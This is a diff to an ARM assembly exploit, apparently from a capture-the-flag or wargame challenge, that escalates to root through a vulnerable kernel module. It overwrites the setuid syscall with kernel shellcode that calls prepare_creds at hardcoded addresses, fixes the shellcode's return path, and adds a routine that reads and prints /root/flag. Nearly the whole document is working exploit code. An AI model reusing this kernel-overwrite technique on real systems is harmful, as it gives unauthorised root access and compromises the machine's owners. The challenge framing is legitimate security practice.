@@ -1,4 +1,4 @@
-@ rm /tmp/pe.s; vi /tmp/pe.s; as /tmp/pe.s -o /tmp/pe.o; ld /tmp/pe.o -o /tmp/pe; /tmp/pe | base64
+@ rm /tmp/pe.s; vi /tmp/pe.s; as /tmp/pe.s -o /tmp/pe.o; ld /tmp/pe.o -o /tmp/pe; /tmp/pe
 
 .text
 .global _start
@@ -22,13 +22,15 @@ _start:
     @ print 4 bytes 
     @ in out
     @ print the uid basically
-    ldr r0, =_out
-    mov r1, #4
-    bl _print
+    @ldr r0, =_out
+    @mov r1, #4
+    @bl _print
 
     @ overrite setuid
     bl _overwrite_setuid
     bl _trigger_setuid
+
+    bl _read_flag
 
     
 _exit:
@@ -66,6 +68,9 @@ _read_addr: @ read_setuid(offset@r0)
     mov pc, lr
 
 
+@ the loop is pretty stupid
+@ one time would've worked almost certainly 
+@ but i wanted to make sure every byte was written
 _overwrite_setuid: 
     ldr r9, =_shellcode_end @ r9 end of shellcode pointer
     ldr r8, =_shellcode @ r8 shellcode pointer
@@ -109,10 +114,37 @@ _getuid:
     mov pc, lr
 
 _read_flag:
-@TODO: IMPLEMENT
+    @ open flag file
+    mov r7, #0x5
+    ldr r0, =_flag
+    mov r1, #0x0
+    mov r2, #0x0
+    swi #0
+
+    @ save fd in r6
+    mov r6, r0
+
+    mov r7, #0x3
+    mov r0, r6 @ redundant but still
+    ldr r1, =_out
+    mov r2, #0x1000
+    swi #0
+
+    @ keep the file open
+    @ what the heck, we already messed up the kernel anyway
+    @ bytes read in r6
+    mov r6, r0
+    mov r7, #0x4
+    mov r0, #0x1
+    ldr r1, =_out
+    mov r2, r6
+    swi #0
+
     mov pc, lr
 
 .data
+_flag:
+    .string "/root/flag"
 _in:
     .string "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n"          @ our string, NULL terminated
 
@@ -129,6 +161,12 @@ _addr:
     .word 0x80196b58
 
 _shellcode:
+    @ this will only work if you're calling setuid(0)
+    @ because of null bytes issues i couldn't figure out a way
+    @ to get r0=zero
+    @ save registers just like sys_upper in m.ko
+    push {r3, r4, r5, lr}
+
     @ 8003f44c T prepare_creds
     @ r0 should contain our setuid 0
     @ shouldn't be a problem
@@ -136,7 +174,6 @@ _shellcode:
     @ldr r9, [r9]
     @ that's a good replacement
     @ save return address
-    push {lr}
     movw r9, #0xf924
     movt r9, #0x8003
     mov lr, pc
@@ -169,8 +206,13 @@ _shellcode:
     @ would that work?
     @ forgot to save return address
     @ fuck me
-    movt r1, #0x4141
-    mov pc, r1
+    @ movt r1, #0x4141
+    @ mov pc, r1
+
+    @ return just like sys_upper
+    @ hopefully this works
+    @ and the exploit is complete
+    pop {r3, r4, r5, pc}
 
 _prepare_creds:
     .word 0x8003f44c
